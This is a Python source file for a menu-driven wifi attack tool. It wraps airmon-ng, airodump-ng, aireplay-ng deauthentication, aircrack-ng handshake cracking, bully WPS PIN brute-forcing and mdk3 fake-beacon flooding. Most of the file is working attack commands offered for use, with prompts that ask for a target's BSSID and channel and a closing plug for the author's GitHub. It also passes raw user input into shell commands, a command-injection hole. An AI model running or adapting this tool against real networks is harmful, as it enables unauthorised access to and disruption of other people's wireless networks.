from banner.banner import *


def slowly(s):
  try:
    time.sleep(1)
    for w in s + '\n' :
      sys.stdout.write(w)
      sys.stdout.flush()
      time.sleep(7. / 100)
    print('\n')
    time.sleep(2)
  except KeyboardInterrupt:
    time.sleep(1)
    slowly(FAIL+'Exiting...')
    print('\n')
    sys.exit(0)

############################################################

print(" \033[1;37moptions: ")
WH = int(input(" \033[1;39m>> \033[1;39m"))

if WH == 1:
	os.system("clear")
	banner()
	print(" \033[1;37mplease select wifi interface for attack (\033[0;37mwlan\033[0;31m0 \033[1;37m| \033[0;37mwlan\033[0;34m1\033[1;37m)")
	interfaz = input(" \033[1;39m>> \033[0;39m")
	comando = "airmon-ng start {} && airmon-ng check kill".format(interfaz)
	os.system(comando)
	os.system("python3 wifi-hack.py")

elif WH == 2:
    os.system("clear")
    banner()
    print(" \033[1;37mplease select wifi interface for attack : (\033[0;37mwlan\033[0;31m0\033[0;37mmon \033[1;37m| \033[0;37mwlan\033[0;34m1\033[0;37mmon\033[1;37m)\033[0m")
    interfaz = input(" \033[1;39m>> \033[0;39m")
    comando = "airmon-ng stop {}".format(interfaz)  
    os.system(comando)
    os.system("python3 wifi-hack.py")

elif WH == 3:
	os.system("clear")
	print("\n\033[0m")
	os.system("sudo ifconfig")
	time.sleep(20)
	os.system("clear")
	os.system("python3 wifi-hack.py")

elif WH == 4:
    os.system("clear")
    banner()
    slowly(" \033[1;37mrestarting please wait...\033[0m")
    comando = "sudo systemctl restart NetworkManager"
    os.system(comando)
    print(" \033[1;31mtask finished!\033[0m")
    time.sleep(2)
    os.system("clear")
    os.system("python3 wifi-hack.py")


elif WH == 5:
    os.system("clear")
    banner()
    print(" \033[1;37mplease select wifi inerface for attack : (\033[0;37mwlan\033[0;31m0\033[0;37\033[1;37m| \033[0;37mwlan\033[0;34m1\033[0;37\033[1;37m)\033[0m")
    interfaz = input(" \033[1;39m>> \033[0;39m")
    print("\033[1;37menter the name of the output file : (ex: \033[0;31mrandom-output\033[0m\033[1;37m)\033[0m")
    archivo_salida = input(" \033[1;39m>> \033[0;39m")
    comando = "airodump-ng --write scan-output/{} --output-format csv  {}".format(archivo_salida,interfaz)
    print("\n \033[1;31m[WARNING] \033[0;37mwhen finished press  \033[1;37mCTRL + C\033[0m")
    time.sleep(3)
    try:
        os.system(comando)
    except KeyboardInterrupt:
        print("\n\n \033[1;31m[WARNING] \033[0;37Escanning stopped saving results ...\033[0m")
        time.sleep(2)
    finally:
        time.sleep(3)
        print("\n\033[1;37mdata has been saved at: \033[0;37mscan-output/\033[0;32m{}01.csv\033[0m".format(archivo_salida))
        
        print("\033[1;37mwould you like to return to the menu? (\033[0;32my\033[0;37m/\033[0;31mn\033[1;37m):\033[0m")
        volver = input(" \033[1;39m>> \033[0;39m").strip().lower()
        if volver != 'y':
            print("\n\033[1;31m[GOODBYE]\033[0m killing  program...")
            time.sleep(1)
            exit(0)
        else:
            os.system('python3 wifi-hack.py')  

elif WH == 6:
    os.system("clear")
    banner()
    print(" \033[1;37mplease sele wifi interface for the attack: (\033[0;37mwlan\033[0;31m0\033[0;37mmon \033[1;37m| \033[0;37mwlan\033[0;34m1\033[0;37mmon\033[1;37m)\033[0m")
    interfaz = input(" \033[1;39m>> \033[0;39m")
    comando = "airodump-ng {}".format(interfaz)
    print("\n \033[1;31m[WARNING] \033[0;37mwhen finished press\033[1;37mCTRL + C\033[0m")
    time.sleep(2)
    os.system(comando)
    print("\n enter \033[1;32mBSSID\033[0m from target:")
    bssid = str(input(" \033[1;39m>> \033[0;39m"))
    print("\n enter \033[1;32mCHANNEL\033[0m from target:")
    channel = int(input(" \033[1;39m>> \033[0;39m"))
    print("\n enter \033[1;32mRUTA\033[0m where would you like to save the handshake:")
    ruta = str(input(" \033[1;39m>> \033[0;39m"))
    print("\n enter the number of packets (max 10000 | min 0):")
    paquetes = int(input(" \033[1;39m>> \033[0;39m"))
    comando = "airodump-ng -c {} --bssid {} -w {} {} | xterm -e aireplay-ng -0 {} -a {} {}".format(channel,bssid,ruta,interfaz,paquetes,bssid,interfaz)
    os.system(comando)
    time.sleep(2)
    os.system("clear")
    os.system("python3 wifi-hack.py")

elif WH == 7:
    os.system("clear")
    banner()
    print(" \033[1;37menter the handshake:\033[0m")
    ruta = str(input(" \033[1;39m>> \033[0;39m"))
    print("")
    print(" \033[1;37menter the directory :\033[0m")
    diccionario = str(input(" \033[1;39m>> \033[0;39m"))
    comando = "aircrack-ng {} -w {}".format(ruta,diccionario)
    os.system(comando)
    exit()

elif WH == 8:
    os.system("clear")
    banner()
    print(" \033[1;37mplease select the wifi interface for the attack: (\033[0;37mwlan\033[0;31m0\033[0;37mmon \033[1;37m| \033[0;37mwlan\033[0;34m1\033[0;37mmon\033[1;37m)\033[0m")
    interfaz = input(" \033[1;39m>> \033[0;39m")
    print(" \033[1;37menter the BSSID of the AP :")
    bssid = input(" \033[1;39m>> \033[0;39m")
    print(" \033[1;37menter the channel of the AP:")
    channel = input(" \033[1;39m>> \033[0;39m")
    print(" \033[1;37menter the ESSID of the AP:")
    essid = input(" \033[1;39m>> \033[0;39m")
    comando = "bully {} -b {} -c {} -e {} --force".format(interfaz, bssid, channel, essid)
    os.system(comando)

   

elif WH == 9:
    os.system('clear')
    banner()
    print(" \033[1;37mplease select the wifi interface for the attack : (\033[0;37mwlanmon\033[0;31m0 \033[1;37m| \033[0;37mwlanmon\033[0;34m1\033[1;37m)")
    interface = input(" \033[1;32m>> \033[0;37m")
    print(" \033[1;37menter channel:")
    channel = input(" \033[1;32m>> \033[0;37m")
    (" \033[1;37mdo you want to create a directory for the fake AP ? [\033[1;32my\033[0m/\033[1;31mn\033[0m]\033[0m")
    crearDic = input(" \033[1;32m>> \033[0;37m")
    if crearDic == 'y':
        os.system('sudo bash AP_generator.sh')

    elif crearDic == 'n':
        pass    

    print("\n\033[1;37m enter the path \033[0m (:\033[1;37m/#!/bin/bash\033[0m): ")
    diccionario = str(input(" \033[1;32m>> \033[0;37m"))
    print("\n \033[1;31m[WARNING] \033[0;37mPress \033[1;37m\033[1;37mCTRL + C \033[0;37mto stop the attack \033[0m")
    os.system("mdk3 {} b -f {} -a -s 1000 -c {}".format(interface,diccionario,channel))
    time.sleep(2)   

elif WH == 0:
    os.system("clear")
    goodbye()
    exit() 

#END CODE       
#codded my Zod-the-immortal 
#follow my github if you liked this tool https://github.com/rottingratto thanks!!!!!
